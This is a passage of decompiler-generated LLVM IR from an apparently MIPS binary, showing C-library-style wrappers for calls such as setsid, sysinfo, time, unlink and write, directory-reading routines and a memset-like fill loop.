  %v4_404e4c = phi i32 [ %v7_404e20, %dec_label_pc_404e00 ], [ -1, %dec_label_pc_404e2c ]
  ret i32 %v4_404e4c

; uselistorder directives
  uselistorder label %dec_label_pc_404e44, { 1, 0 }
}

define i32 @function_404e60(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404e60:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @a3, align 4
  %v3_404ea0 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404ea0, i32* @t9, align 4
  %v1_404ea4 = icmp eq i32 %arg1, 0
  store i32 4142, i32* %s0.global-to-local, align 4
  br i1 %v1_404ea4, label %dec_label_pc_404ec0, label %dec_label_pc_404ea8

dec_label_pc_404ea8:                              ; preds = %dec_label_pc_404e60
  %v1_404eac = call i32 @function_405490()
  %v0_404eb8 = load i32, i32* %s0.global-to-local, align 4
  %v2_404eb8 = inttoptr i32 %v1_404eac to i32*
  store i32 %v0_404eb8, i32* %v2_404eb8, align 4
  br label %dec_label_pc_404ec0

dec_label_pc_404ec0:                              ; preds = %dec_label_pc_404e60, %dec_label_pc_404ea8
  %v4_404ed0 = phi i32 [ 4142, %dec_label_pc_404e60 ], [ -1, %dec_label_pc_404ea8 ]
  ret i32 %v4_404ed0

; uselistorder directives
  uselistorder label %dec_label_pc_404ec0, { 1, 0 }
}

define i32 @function_404ee0() local_unnamed_addr {
dec_label_pc_404ee0:
  %s0.global-to-local = alloca i32, align 4
  %v0_404f00 = call i32 @setsid()
  %v3_404f04 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404f04, i32* @t9, align 4
  %v0_404f08 = load i32, i32* @a3, align 4
  %v1_404f08 = icmp eq i32 %v0_404f08, 0
  store i32 %v0_404f00, i32* %s0.global-to-local, align 4
  br i1 %v1_404f08, label %dec_label_pc_404f24, label %dec_label_pc_404f0c

dec_label_pc_404f0c:                              ; preds = %dec_label_pc_404ee0
  %v1_404f10 = call i32 @function_405490()
  %v0_404f1c = load i32, i32* %s0.global-to-local, align 4
  %v2_404f1c = inttoptr i32 %v1_404f10 to i32*
  store i32 %v0_404f1c, i32* %v2_404f1c, align 4
  br label %dec_label_pc_404f24

dec_label_pc_404f24:                              ; preds = %dec_label_pc_404ee0, %dec_label_pc_404f0c
  %v4_404f2c = phi i32 [ %v0_404f00, %dec_label_pc_404ee0 ], [ -1, %dec_label_pc_404f0c ]
  ret i32 %v4_404f2c

; uselistorder directives
  uselistorder label %dec_label_pc_404f24, { 1, 0 }
}

define i32 @function_404f40(%sysinfo* %arg1) local_unnamed_addr {
dec_label_pc_404f40:
  %s0.global-to-local = alloca i32, align 4
  %v3_404f60 = call i32 @sysinfo(%sysinfo* %arg1)
  %v3_404f64 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404f64, i32* @t9, align 4
  %v0_404f68 = load i32, i32* @a3, align 4
  %v1_404f68 = icmp eq i32 %v0_404f68, 0
  store i32 %v3_404f60, i32* %s0.global-to-local, align 4
  br i1 %v1_404f68, label %dec_label_pc_404f84, label %dec_label_pc_404f6c

dec_label_pc_404f6c:                              ; preds = %dec_label_pc_404f40
  %v1_404f70 = call i32 @function_405490()
  %v0_404f7c = load i32, i32* %s0.global-to-local, align 4
  %v2_404f7c = inttoptr i32 %v1_404f70 to i32*
  store i32 %v0_404f7c, i32* %v2_404f7c, align 4
  br label %dec_label_pc_404f84

dec_label_pc_404f84:                              ; preds = %dec_label_pc_404f40, %dec_label_pc_404f6c
  %v4_404f8c = phi i32 [ %v3_404f60, %dec_label_pc_404f40 ], [ -1, %dec_label_pc_404f6c ]
  ret i32 %v4_404f8c

; uselistorder directives
  uselistorder label %dec_label_pc_404f84, { 1, 0 }
}

define i32 @function_404fa0(i32* %arg1) local_unnamed_addr {
dec_label_pc_404fa0:
  %s0.global-to-local = alloca i32, align 4
  %v2_404fc0 = call i32 @time(i32* %arg1)
  %v3_404fc4 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404fc4, i32* @t9, align 4
  %v0_404fc8 = load i32, i32* @a3, align 4
  %v1_404fc8 = icmp eq i32 %v0_404fc8, 0
  store i32 %v2_404fc0, i32* %s0.global-to-local, align 4
  br i1 %v1_404fc8, label %dec_label_pc_404fe4, label %dec_label_pc_404fcc

dec_label_pc_404fcc:                              ; preds = %dec_label_pc_404fa0
  %v1_404fd0 = call i32 @function_405490()
  %v0_404fdc = load i32, i32* %s0.global-to-local, align 4
  %v2_404fdc = inttoptr i32 %v1_404fd0 to i32*
  store i32 %v0_404fdc, i32* %v2_404fdc, align 4
  br label %dec_label_pc_404fe4

dec_label_pc_404fe4:                              ; preds = %dec_label_pc_404fa0, %dec_label_pc_404fcc
  %v4_404fec = phi i32 [ %v2_404fc0, %dec_label_pc_404fa0 ], [ -1, %dec_label_pc_404fcc ]
  ret i32 %v4_404fec

; uselistorder directives
  uselistorder label %dec_label_pc_404fe4, { 1, 0 }
}

define i32 @function_405000(i8* %arg1) local_unnamed_addr {
dec_label_pc_405000:
  %s0.global-to-local = alloca i32, align 4
  %v3_405020 = call i32 @unlink(i8* %arg1)
  %v3_405024 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_405024, i32* @t9, align 4
  %v0_405028 = load i32, i32* @a3, align 4
  %v1_405028 = icmp eq i32 %v0_405028, 0
  store i32 %v3_405020, i32* %s0.global-to-local, align 4
  br i1 %v1_405028, label %dec_label_pc_405044, label %dec_label_pc_40502c

dec_label_pc_40502c:                              ; preds = %dec_label_pc_405000
  %v1_405030 = call i32 @function_405490()
  %v0_40503c = load i32, i32* %s0.global-to-local, align 4
  %v2_40503c = inttoptr i32 %v1_405030 to i32*
  store i32 %v0_40503c, i32* %v2_40503c, align 4
  br label %dec_label_pc_405044

dec_label_pc_405044:                              ; preds = %dec_label_pc_405000, %dec_label_pc_40502c
  %v4_40504c = phi i32 [ %v3_405020, %dec_label_pc_405000 ], [ -1, %dec_label_pc_40502c ]
  ret i32 %v4_40504c

; uselistorder directives
  uselistorder label %dec_label_pc_405044, { 1, 0 }
}

define i32 @function_405060(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405060:
  %s0.global-to-local = alloca i32, align 4
  %v4_405080 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  %v3_405084 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_405084, i32* @t9, align 4
  %v0_405088 = load i32, i32* @a3, align 4
  %v1_405088 = icmp eq i32 %v0_405088, 0
  store i32 %v4_405080, i32* %s0.global-to-local, align 4
  br i1 %v1_405088, label %dec_label_pc_4050a4, label %dec_label_pc_40508c

dec_label_pc_40508c:                              ; preds = %dec_label_pc_405060
  %v1_405090 = call i32 @function_405490()
  %v0_40509c = load i32, i32* %s0.global-to-local, align 4
  %v2_40509c = inttoptr i32 %v1_405090 to i32*
  store i32 %v0_40509c, i32* %v2_40509c, align 4
  br label %dec_label_pc_4050a4

dec_label_pc_4050a4:                              ; preds = %dec_label_pc_405060, %dec_label_pc_40508c
  %v4_4050ac = phi i32 [ %v4_405080, %dec_label_pc_405060 ], [ -1, %dec_label_pc_40508c ]
  ret i32 %v4_4050ac

; uselistorder directives
  uselistorder label %dec_label_pc_4050a4, { 1, 0 }
}

define i32 @function_4050c0(i32* %arg1) local_unnamed_addr {
dec_label_pc_4050c0:
  %s0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v0_4050e0 = load i32, i32* @s0, align 4
  store i32 %tmp, i32* @s1, align 4
  %v3_4050ec = load i32, i32* @global_var_449368.230, align 4
  %v2_4050f0 = load i32, i32* %arg1, align 4
  %v1_4050f4 = add i32 %tmp, 24
  store i32 %v1_4050f4, i32* %s0.global-to-local, align 4
  %v2_4050f8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 -1, i32* @s2, align 4
  store i32 %v3_4050ec, i32* %v1.global-to-local, align 4
  %v3_40510c = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_40510c, i32* @t9, align 4
  %v2_405110 = icmp eq i32 %v2_4050f0, -1
  br i1 %v2_405110, label %dec_label_pc_405114, label %dec_label_pc_405134

dec_label_pc_405114:                              ; preds = %dec_label_pc_4050c0
  %v1_405118 = call i32 @function_405490()
  store i32 9, i32* %v1.global-to-local, align 4
  %v2_405130 = inttoptr i32 %v1_405118 to i32*
  store i32 9, i32* %v2_405130, align 4
  %v0_405134.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_405134

dec_label_pc_405134:                              ; preds = %dec_label_pc_4050c0, %dec_label_pc_405114
  %v0_405134 = phi i32 [ %v3_4050ec, %dec_label_pc_4050c0 ], [ %v0_405134.pre, %dec_label_pc_405114 ]
  store i32 ptrtoint (i32* @global_var_405140.301 to i32), i32* @ra, align 4
  call void @__pseudo_call(i32 %v0_405134)
  %v1_405150 = load i32, i32* %s0.global-to-local, align 4
  %v3_405150 = call i32 @function_406744(i32 %v1_405150)
  store i32 %v3_405150, i32* @v0, align 4
  %v0_405164 = load i32, i32* @s1, align 4
  %v1_405164 = inttoptr i32 %v0_405164 to i32*
  %v2_405164 = load i32, i32* %v1_405164, align 4
  store i32 %v2_405164, i32* @s0, align 4
  %v1_40516c = load i32, i32* @s2, align 4
  store i32 %v1_40516c, i32* %v1_405164, align 4
  %v6_40516c = call i32 @function_40674c(i32 %v2_4050f8, i32 1)
  %v0_405178 = load i32, i32* @s1, align 4
  %v1_405178 = add i32 %v0_405178, 12
  %v2_405178 = inttoptr i32 %v1_405178 to i32*
  %v3_405178 = load i32, i32* %v2_405178, align 4
  %v3_40517c = load i32, i32* @global_var_449284.12, align 4
  store i32 %v3_40517c, i32* @t9, align 4
  %v2_405184 = call i32 @function_405f40(i32 %v3_405178)
  %v3_405194 = load i32, i32* @global_var_449284.12, align 4
  store i32 %v3_405194, i32* @t9, align 4
  %v1_40519c = load i32, i32* @s1, align 4
  %v3_40519c = call i32 @function_405f40(i32 %v1_40519c)
  %v3_4051ac = load i32, i32* @global_var_4491f8.304, align 4
  store i32 %v3_4051ac, i32* @t9, align 4
  %v1_4051b4 = load i32, i32* @s0, align 4
  %v3_4051b4 = call i32 @function_4049d0(i32 %v1_4051b4)
  store i32 %v0_4050e0, i32* %s0.global-to-local, align 4
  ret i32 %v3_4051b4

; uselistorder directives
  uselistorder i32 9, { 2, 7, 3, 4, 8, 5, 9, 10, 1, 11, 12, 0, 13, 6, 14 }
  uselistorder label %dec_label_pc_405134, { 1, 0 }
}

define i32 @function_4051f0() local_unnamed_addr {
dec_label_pc_4051f0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %v3_405214 = load i32, i32* @global_var_4491f4.298, align 4
  store i32 %v3_405214, i32* @t9, align 4
  store i32 65664, i32* @a1, align 4
  %v5_40521c = call i32 @function_404bb0(i8* inttoptr (i32 65664 to i8*))
  %v1_405228 = icmp sgt i32 %v5_40521c, -1
  store i32 %v5_40521c, i32* @s0, align 4
  br i1 %v1_405228, label %dec_label_pc_405238, label %dec_label_pc_40522c

dec_label_pc_40522c:                              ; preds = %dec_label_pc_4051f0
  br label %dec_label_pc_405238

dec_label_pc_405238:                              ; preds = %dec_label_pc_4051f0, %dec_label_pc_40522c
  %v3_405238 = load i32, i32* @global_var_4492f0.305, align 4
  store i32 %v3_405238, i32* @t9, align 4
  %v3_405240 = ptrtoint i32* %stack_var_-168 to i32
  %v6_405240 = call i32 @function_406d70(i32 %v5_40521c, i32 %v3_405240)
  %v1_40524c = icmp slt i32 %v6_405240, 0
  %v2_40524c = load i32, i32* @s0, align 4
  store i32 %v2_40524c, i32* @a0, align 4
  br i1 %v1_40524c, label %dec_label_pc_405270, label %dec_label_pc_405250

dec_label_pc_405250:                              ; preds = %dec_label_pc_405238
  %v3_405254 = load i32, i32* @global_var_4491fc.306, align 4
  store i32 %v3_405254, i32* @t9, align 4
  store i32 2, i32* @a1, align 4
  %v1_40525c = call i32 @function_404870()
  %v1_405268 = icmp sgt i32 %v1_40525c, -1
  br i1 %v1_405268, label %dec_label_pc_4052a4, label %dec_label_pc_405270

dec_label_pc_405270:                              ; preds = %dec_label_pc_405250, %dec_label_pc_405238
  %v3_405270 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_405270, i32* @t9, align 4
  %v1_405278 = call i32 @function_405490()
  %v0_405284 = load i32, i32* @s0, align 4
  %v3_405288 = load i32, i32* @global_var_4491f8.304, align 4
  store i32 %v3_405288, i32* @t9, align 4
  %v1_40528c = inttoptr i32 %v1_405278 to i32*
  %v2_40528c = load i32, i32* %v1_40528c, align 4
  store i32 %v2_40528c, i32* @s0, align 4
  store i32 %v1_405278, i32* @s1, align 4
  %v3_405290 = call i32 @function_4049d0(i32 %v0_405284)
  %v0_4052a0 = load i32, i32* @s0, align 4
  %v1_4052a0 = load i32, i32* @s1, align 4
  %v2_4052a0 = inttoptr i32 %v1_4052a0 to i32*
  store i32 %v0_4052a0, i32* %v2_4052a0, align 4
  br label %dec_label_pc_4052a4

dec_label_pc_4052a4:                              ; preds = %dec_label_pc_405250, %dec_label_pc_405270
  %v3_4052a4 = load i32, i32* @global_var_449458.24, align 4
  store i32 %v3_4052a4, i32* @t9, align 4
  %v2_4052ac = call i32 @function_405c90(i32 48)
  %v1_4052b8 = icmp eq i32 %v2_4052ac, 0
  store i32 %v2_4052ac, i32* @s2, align 4
  br i1 %v1_4052b8, label %dec_label_pc_405320, label %dec_label_pc_4052bc

dec_label_pc_4052bc:                              ; preds = %dec_label_pc_4052a4
  %v0_4052c0 = load i32, i32* @s0, align 4
  %v2_4052c0 = inttoptr i32 %v2_4052ac to i32*
  store i32 %v0_4052c0, i32* %v2_4052c0, align 4
  %v1_4052c4 = add i32 %v2_4052ac, 16
  %v2_4052c4 = inttoptr i32 %v1_4052c4 to i32*
  store i32 0, i32* %v2_4052c4, align 4
  %v1_4052c8 = add i32 %v2_4052ac, 8
  %v2_4052c8 = inttoptr i32 %v1_4052c8 to i32*
  store i32 0, i32* %v2_4052c8, align 4
  %v1_4052cc = add i32 %v2_4052ac, 4
  %v2_4052cc = inttoptr i32 %v1_4052cc to i32*
  store i32 0, i32* %v2_4052cc, align 4
  store i32 %tmp, i32* @v0, align 4
  %v1_4052d8 = icmp ult i32 %tmp, 512
  %v1_4052dc = icmp eq i1 %v1_4052d8, false
  %v3_4052dc = load i32, i32* @s2, align 4
  %v4_4052dc = add i32 %v3_4052dc, 20
  %v5_4052dc = inttoptr i32 %v4_4052dc to i32*
  store i32 %tmp, i32* %v5_4052dc, align 4
  br i1 %v1_4052dc, label %dec_label_pc_4052ec, label %dec_label_pc_4052e0

dec_label_pc_4052e0:                              ; preds = %dec_label_pc_4052bc
  store i32 512, i32* @v0, align 4
  %v1_4052e8 = load i32, i32* @s2, align 4
  %v2_4052e8 = add i32 %v1_4052e8, 20
  %v3_4052e8 = inttoptr i32 %v2_4052e8 to i32*
  store i32 512, i32* %v3_4052e8, align 4
  br label %dec_label_pc_4052ec

dec_label_pc_4052ec:                              ; preds = %dec_label_pc_4052bc, %dec_label_pc_4052e0
  %v3_4052ec = load i32, i32* @global_var_4493f0.14, align 4
  store i32 %v3_4052ec, i32* @t9, align 4
  %v0_4052f0 = load i32, i32* @s2, align 4
  %v1_4052f0 = add i32 %v0_4052f0, 20
  %v2_4052f0 = inttoptr i32 %v1_4052f0 to i32*
  %v3_4052f0 = load i32, i32* %v2_4052f0, align 4
  %v4_4052f4 = call i32 @function_405e80(i64 1, i32 %v3_4052f0)
  %v1_405300 = icmp eq i32 %v4_4052f4, 0
  %v3_405300 = load i32, i32* @s2, align 4
  %v4_405300 = add i32 %v3_405300, 12
  %v5_405300 = inttoptr i32 %v4_405300 to i32*
  store i32 %v4_4052f4, i32* %v5_405300, align 4
  br i1 %v1_405300, label %dec_label_pc_405304, label %dec_label_pc_405358

dec_label_pc_405304:                              ; preds = %dec_label_pc_4052ec
  %v3_405308 = load i32, i32* @global_var_449284.12, align 4
  store i32 %v3_405308, i32* @t9, align 4
  %v1_405310 = load i32, i32* @s2, align 4
  %v3_405310 = call i32 @function_405f40(i32 %v1_405310)
  br label %dec_label_pc_405320

dec_label_pc_405320:                              ; preds = %dec_label_pc_4052a4, %dec_label_pc_405304
  %v3_405320 = load i32, i32* @global_var_4491f8.304, align 4
  store i32 %v3_405320, i32* @t9, align 4
  %v1_405328 = load i32, i32* @s0, align 4
  %v3_405328 = call i32 @function_4049d0(i32 %v1_405328)
  %v3_405338 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_405338, i32* @t9, align 4
  store i32 0, i32* @s2, align 4
  %v1_405340 = call i32 @function_405490()
  %v2_405354 = inttoptr i32 %v1_405340 to i32*
  store i32 12, i32* %v2_405354, align 4
  br label %dec_label_pc_405358

dec_label_pc_405358:                              ; preds = %dec_label_pc_4052ec, %dec_label_pc_405320
  %v0_40535c = load i32, i32* @s2, align 4
  %v1_40535c = add i32 %v0_40535c, 24
  %v2_405360 = call i32 @function_406744(i32 %v1_40535c)
  %v0_40536c = load i32, i32* @s2, align 4
  ret i32 %v0_40536c

; uselistorder directives
  uselistorder i32 %v2_4052ac, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 %v1_405278, { 1, 0 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_405f40, { 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 512, { 0, 2, 3, 1, 4 }
  uselistorder i32 (i32)* @function_405c90, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_4049d0, { 9, 8, 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_405358, { 1, 0 }
  uselistorder label %dec_label_pc_405320, { 1, 0 }
  uselistorder label %dec_label_pc_4052ec, { 1, 0 }
  uselistorder label %dec_label_pc_4052a4, { 1, 0 }
  uselistorder label %dec_label_pc_405238, { 1, 0 }
}

define i32 @function_405390(i32* %arg1) local_unnamed_addr {
dec_label_pc_405390:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v1_4053b4 = add i32 %tmp, 24
  store i32 %v1_4053b4, i32* @s0, align 4
  %v3_4053b8 = load i32, i32* @global_var_4493ec.300, align 4
  store i32 %tmp, i32* @s1, align 4
  %v3_4053c4 = ptrtoint i32* %stack_var_-32 to i32
  %v6_4053c4 = call i32 @function_40674c(i32 %v3_4053c4, i32 %v3_4053b8)
  %v1_4053dc = load i32, i32* @s0, align 4
  %v3_4053dc = call i32 @function_406744(i32 %v1_4053dc)
  br label %dec_label_pc_4053e8

dec_label_pc_4053e8:                              ; preds = %dec_label_pc_405428, %dec_label_pc_405390
  %v0_4053e8 = load i32, i32* @s1, align 4
  %v1_4053e8 = add i32 %v0_4053e8, 4
  %v2_4053e8 = inttoptr i32 %v1_4053e8 to i32*
  %v3_4053e8 = load i32, i32* %v2_4053e8, align 4
  %v1_4053ec = add i32 %v0_4053e8, 8
  %v2_4053ec = inttoptr i32 %v1_4053ec to i32*
  %v3_4053ec = load i32, i32* %v2_4053ec, align 4
  %v3_4053f0 = load i32, i32* @global_var_449498.308, align 4
  store i32 %v3_4053f0, i32* @t9, align 4
  %v2_4053f4 = icmp ult i32 %v3_4053e8, %v3_4053ec
  br i1 %v2_4053f4, label %dec_label_pc_405428, label %dec_label_pc_4053fc

dec_label_pc_4053fc:                              ; preds = %dec_label_pc_4053e8
  %v1_405400 = inttoptr i32 %v0_4053e8 to i32*
  %v2_405400 = load i32, i32* %v1_405400, align 4
  store i32 %v2_405400, i32* @a0, align 4
  %v1_405404 = add i32 %v0_4053e8, 12
  %v2_405404 = inttoptr i32 %v1_405404 to i32*
  %v3_405404 = load i32, i32* %v2_405404, align 4
  %v1_405408 = add i32 %v0_4053e8, 20
  %v2_405408 = inttoptr i32 %v1_405408 to i32*
  %v3_405408 = load i32, i32* %v2_405408, align 4
  store i32 %v3_405408, i32* @a2, align 4
  %v4_40540c = inttoptr i32 %v2_405400 to i32*
  %v5_40540c = call i32 @function_406e00(i32* %v4_40540c, i32 %v3_405404, i32 %v3_405408)
  store i32 %v5_40540c, i32* @v0, align 4
  %v1_405418 = icmp slt i32 %v5_40540c, 1
  store i32 0, i32* @s0, align 4
  br i1 %v1_405418, label %dec_label_pc_405464, label %dec_label_pc_40541c

dec_label_pc_40541c:                              ; preds = %dec_label_pc_4053fc
  %v1_405420 = load i32, i32* @s1, align 4
  %v2_405420 = add i32 %v1_405420, 8
  %v3_405420 = inttoptr i32 %v2_405420 to i32*
  store i32 %v5_40540c, i32* %v3_405420, align 4
  %v0_405424 = load i32, i32* @s1, align 4
  %v1_405424 = add i32 %v0_405424, 4
  %v2_405424 = inttoptr i32 %v1_405424 to i32*
  store i32 0, i32* %v2_405424, align 4
  %v0_405428.pre = load i32, i32* @s1, align 4
  br label %dec_label_pc_405428

dec_label_pc_405428:                              ; preds = %dec_label_pc_4053e8, %dec_label_pc_40541c
  %v1_405444 = phi i32 [ %v0_4053e8, %dec_label_pc_4053e8 ], [ %v0_405428.pre, %dec_label_pc_40541c ]
  %v1_405428 = add i32 %v1_405444, 4
  %v2_405428 = inttoptr i32 %v1_405428 to i32*
  %v3_405428 = load i32, i32* %v2_405428, align 4
  %v1_40542c = add i32 %v1_405444, 12
  %v2_40542c = inttoptr i32 %v1_40542c to i32*
  %v3_40542c = load i32, i32* %v2_40542c, align 4
  %v2_405434 = add i32 %v3_40542c, %v3_405428
  store i32 %v2_405434, i32* @s0, align 4
  %v1_405438 = add i32 %v2_405434, 8
  %v2_405438 = inttoptr i32 %v1_405438 to i16*
  %v3_405438 = load i16, i16* %v2_405438, align 2
  %v4_405438 = zext i16 %v3_405438 to i32
  %v2_405440 = add i32 %v4_405438, %v3_405428
  store i32 %v2_405440, i32* %v2_405428, align 4
  %v0_405448 = load i32, i32* @s0, align 4
  %v1_405448 = add i32 %v0_405448, 4
  %v2_405448 = inttoptr i32 %v1_405448 to i32*
  %v3_405448 = load i32, i32* %v2_405448, align 4
  %v1_405450 = load i32, i32* @s1, align 4
  %v2_405450 = add i32 %v1_405450, 16
  %v3_405450 = inttoptr i32 %v2_405450 to i32*
  store i32 %v3_405448, i32* %v3_405450, align 4
  %v0_405454 = load i32, i32* @s0, align 4
  %v1_405454 = inttoptr i32 %v0_405454 to i32*
  %v2_405454 = load i32, i32* %v1_405454, align 4
  store i32 %v2_405454, i32* @v0, align 4
  %v1_40545c = icmp eq i32 %v2_405454, 0
  br i1 %v1_40545c, label %dec_label_pc_4053e8, label %dec_label_pc_405464

dec_label_pc_405464:                              ; preds = %dec_label_pc_405428, %dec_label_pc_4053fc
  %v3_40546c = call i32 @function_40674c(i32 %v3_4053c4, i32 1)
  %v0_405474 = load i32, i32* @s0, align 4
  ret i32 %v0_405474

; uselistorder directives
  uselistorder i32 %v1_405444, { 1, 0 }
  uselistorder i32 %v0_4053e8, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_405428, { 1, 0 }
}

define i32 @function_405490() local_unnamed_addr {
dec_label_pc_405490:
  %v3_40549c = load i32, i32* bitcast (i32** @global_var_4492ac.310 to i32*), align 4
  ret i32 %v3_40549c
}

define i32 @function_4054b0() local_unnamed_addr {
dec_label_pc_4054b0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v3_4054c8 = load i32, i32* @global_var_4493b4.311, align 4
  store i32 %v3_4054c8, i32* @t9, align 4
  %v5_4054d0 = bitcast i32* %stack_var_-24 to %tms*
  %v6_4054d0 = call i32 @function_407460(%tms* %v5_4054d0)
  %v3_4054dc = load i32, i32* %stack_var_-24, align 4
  %v2_4054e4 = add i32 %v3_4054dc, %tmp
  %v1_405504 = mul i32 %v2_4054e4, 10000
  %v2_405510 = and i32 %v1_405504, 2147483632
  ret i32 %v2_405510

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_405520(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405520:
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %a2.global-to-local, align 4
  store i32 %arg2, i32* @a1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @a0, align 4
  %v1_405520 = icmp slt i32 %arg3, 8
  %v2_405520 = zext i1 %v1_405520 to i32
  store i32 %v2_405520, i32* @t1, align 4
  br i1 %v1_405520, label %dec_label_pc_405594, label %dec_label_pc_405528

dec_label_pc_405528:                              ; preds = %dec_label_pc_405520
  %v1_40552c = icmp eq i32 %arg2, 0
  %v3_40552c = urem i32 %arg2, 256
  br i1 %v1_40552c, label %dec_label_pc_405544, label %dec_label_pc_405530

dec_label_pc_405530:                              ; preds = %dec_label_pc_405528
  %v1_405534 = mul nuw nsw i32 %v3_40552c, 256
  %v2_405538 = or i32 %v1_405534, %v3_40552c
  %v1_40553c = mul i32 %v2_405538, 65536
  %v2_405540 = or i32 %v1_40553c, %v2_405538
  br label %dec_label_pc_405544

dec_label_pc_405544:                              ; preds = %dec_label_pc_405528, %dec_label_pc_405530
  %storemerge = phi i32 [ %v2_405540, %dec_label_pc_405530 ], [ %v3_40552c, %dec_label_pc_405528 ]
  %v0_4055744 = phi i32 [ %v2_405540, %dec_label_pc_405530 ], [ %v3_40552c, %dec_label_pc_405528 ]
  store i32 %storemerge, i32* @a1, align 4
  %v1_405544 = sub i32 0, %tmp
  %v1_405548 = urem i32 %v1_405544, 4
  %v1_40554c = icmp eq i32 %v1_405548, 0
  %v4_40554c = sub i32 %arg3, %v1_405548
  store i32 %v4_40554c, i32* %a2.global-to-local, align 4
  br i1 %v1_40554c, label %dec_label_pc_40555c, label %dec_label_pc_405550

dec_label_pc_405550:                              ; preds = %dec_label_pc_405544
  %v2_405558 = add i32 %v1_405548, %tmp
  store i32 %v2_405558, i32* @a0, align 4
  br label %dec_label_pc_40555c

dec_label_pc_40555c:                              ; preds = %dec_label_pc_405544, %dec_label_pc_405550
  %v1_405568 = phi i32 [ %tmp, %dec_label_pc_405544 ], [ %v2_405558, %dec_label_pc_405550 ]
  %v1_40555c = urem i32 %v4_40554c, 8
  %v2_405560 = icmp eq i32 %v4_40554c, %v1_40555c
  %v5_405560 = sub i32 %v4_40554c, %v1_40555c
  store i32 %v5_405560, i32* %a3.global-to-local, align 4
  br i1 %v2_405560, label %dec_label_pc_405580, label %dec_label_pc_405564

dec_label_pc_405564:                              ; preds = %dec_label_pc_40555c
  %v2_405568 = add i32 %v1_405568, %v5_405560
  store i32 %v2_405568, i32* %a3.global-to-local, align 4
  store i32 %v1_40555c, i32* %a2.global-to-local, align 4
  %v1_40557016 = add i32 %v1_405568, 8
  store i32 %v1_40557016, i32* @a0, align 4
  %v3_40557417 = inttoptr i32 %v1_405568 to i32*
  store i32 %v0_4055744, i32* %v3_40557417, align 4
  %v0_40557818 = load i32, i32* @a0, align 4
  %v1_40557819 = load i32, i32* %a3.global-to-local, align 4
  %v2_40557820 = icmp eq i32 %v0_40557818, %v1_40557819
  %v3_40557821 = load i32, i32* @a1, align 4
  %v5_40557822 = add i32 %v0_40557818, -4
  %v6_40557823 = inttoptr i32 %v5_40557822 to i32*
  store i32 %v3_40557821, i32* %v6_40557823, align 4
  br i1 %v2_40557820, label %dec_label_pc_405580.loopexit, label %dec_label_pc_405570.dec_label_pc_405570_crit_edge

dec_label_pc_405570.dec_label_pc_405570_crit_edge: ; preds = %dec_label_pc_405564, %dec_label_pc_405570.dec_label_pc_405570_crit_edge
  %v0_405570.pre = load i32, i32* @a0, align 4
  %v0_405574.pre = load i32, i32* @a1, align 4
  %v1_405570 = add i32 %v0_405570.pre, 8
  store i32 %v1_405570, i32* @a0, align 4
  %v3_405574 = inttoptr i32 %v0_405570.pre to i32*
  store i32 %v0_405574.pre, i32* %v3_405574, align 4
  %v0_405578 = load i32, i32* @a0, align 4
  %v1_405578 = load i32, i32* %a3.global-to-local, align 4
  %v2_405578 = icmp eq i32 %v0_405578, %v1_405578
  %v3_405578 = load i32, i32* @a1, align 4
  %v5_405578 = add i32 %v0_405578, -4
  %v6_405578 = inttoptr i32 %v5_405578 to i32*
  store i32 %v3_405578, i32* %v6_405578, align 4
  br i1 %v2_405578, label %dec_label_pc_405580.loopexit, label %dec_label_pc_405570.dec_label_pc_405570_crit_edge

dec_label_pc_405580.loopexit:                     ; preds = %dec_label_pc_405570.dec_label_pc_405570_crit_edge, %dec_label_pc_405564
  %v0_405580.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_405580

dec_label_pc_405580:                              ; preds = %dec_label_pc_405580.loopexit, %dec_label_pc_40555c
  %v0_405580 = phi i32 [ %v0_405580.pre, %dec_label_pc_405580.loopexit ], [ %v4_40554c, %dec_label_pc_40555c ]
  %v1_405580 = and i32 %v0_405580, 4
  %v1_405584 = icmp eq i32 %v1_405580, 0
  %v4_405584 = sub i32 %v0_405580, %v1_405580
  store i32 %v4_405584, i32* %a2.global-to-local, align 4
  br i1 %v1_405584, label %dec_label_pc_405580.dec_label_pc_405594_crit_edge, label %dec_label_pc_405588

dec_label_pc_405580.dec_label_pc_405594_crit_edge: ; preds = %dec_label_pc_405580
  %v3_405594.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_405594

dec_label_pc_405588:                              ; preds = %dec_label_pc_405580
  %v0_40558c = load i32, i32* @a1, align 4
  %v1_40558c = load i32, i32* @a0, align 4
  %v2_40558c = inttoptr i32 %v1_40558c to i32*
